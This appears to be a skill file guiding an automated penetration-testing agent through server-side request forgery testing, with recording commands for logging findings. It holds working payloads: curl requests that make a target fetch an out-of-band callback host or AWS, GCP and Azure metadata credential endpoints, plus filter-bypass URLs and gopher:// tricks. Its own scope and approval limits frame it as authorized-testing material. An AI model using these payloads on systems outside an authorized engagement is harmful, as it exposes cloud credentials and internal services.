---
name: web-ssrf
description: Use when a param makes the server fetch a URL/host — find SSRF sinks, hit cloud metadata, confirm blind SSRF via OOB callbacks, bypass filters. Class ssrf.
---

# Server-side request forgery (SSRF)

The server fetches a URL you control. Least-intrusive proof = an **out-of-band callback** or a differential response, never blindly reading internal secrets beyond what proves impact. Class `ssrf`, CWE-918. Keep target hosts in scope; internal ranges reached *through* an in-scope host are the whole point, but do not pivot to unauthorized external hosts.

Per candidate sink: `record kind=hypothesis ... class=ssrf outcome=testing`.

## 1. Find sinks
Any param taking a URL/host/path the server will retrieve: `url=`, `uri=`, `image=`, `callback=`, `webhook=`, `feed=`, `proxy=`, `dest=`, `redirect=`, PDF/screenshot/thumbnail generators, XML/SVG parsers (see web-xxe), URL previews, import-from-URL, avatar-by-URL.

## 2. Confirm with an OOB callback (works even when blind)
```bash
# get a collaborator/interactsh host, then point the param at it
curl -s "https://TARGET/fetch?url=http://OOB_ID.oast.pro/probe"
# a DNS+HTTP hit on your listener = confirmed SSRF (the SERVER resolved & fetched it)
```
Distinguish DNS-only (egress filtered, resolver reached) from full HTTP hit. A callback from the target's egress IP is the cleanest proof.

## 3. Cloud metadata (high impact — read minimally)
```bash
# AWS IMDSv1
curl -s "https://TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# GCP (needs header — try header-injection sinks): Metadata-Flavor: Google
#   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
# Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01  (Metadata:true header)
# Alibaba/DO: http://100.100.100.200 / http://169.254.169.254
```
Retrieving IAM creds = critical. Prove access to the credentials endpoint; do **not** exfiltrate/use the keys further without engagement approval — `record kind=loot handle=cred:imds ...` and a `finding`.

## 4. Internal service scan (light)
- Point at `http://127.0.0.1:PORT/` and `http://169.254.169.254`, common internal hosts. Use response size / status / timing as an oracle for open vs closed ports. Keep it light — this is enumeration, not a port-flood.

## 5. Filter bypasses (when a naive allowlist/denylist blocks you)
- Alternate IP encodings of 127.0.0.1: `2130706433` (decimal), `0x7f000001`, `0177.0.0.1`, `127.1`, `[::1]`, `0.0.0.0`.
- DNS rebinding / attacker domain resolving to internal IP; `localtest.me`, `nip.io` wildcards.
- Redirect chain: your server 302→`http://169.254.169.254/` (bypasses "must be https"/domain allowlist since the *redirect* is followed).
- Confusion: `http://allowed.com@169.254.169.254`, `http://169.254.169.254#allowed.com`, `http://169.254.169.254%2f@allowed.com`.
- Schemes: `file://`, `gopher://` (raw TCP → internal Redis/SMTP), `dict://`, `ftp://` where the client supports them.

## Confirm vs false positive
- A slow/errored request is not SSRF. Require an OOB hit, a metadata body, or a reproducible internal-vs-external differential.
- Client-side/DNS-only resolution without the server fetching is not confirmed — verify the fetch originates from the target.

## Wire into the loop
```
record kind=hypothesis statement="url= param fetches attacker host" target=e7 class=ssrf approach="point at interactsh, watch DNS+HTTP" outcome=confirmed evidence=evidence/ssrf-oob.txt
record kind=finding title="SSRF in /fetch reaches AWS IMDS" severity=critical target=e7 class=ssrf cwe=CWE-918 status=confirmed hypothesisId=y8 repro="GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" evidence=["evidence/ssrf-imds.txt"]
```
Severity: metadata/creds or internal RCE reach = critical; internal port scan / arbitrary fetch = high; OOB-only with no reachable internal impact = medium.
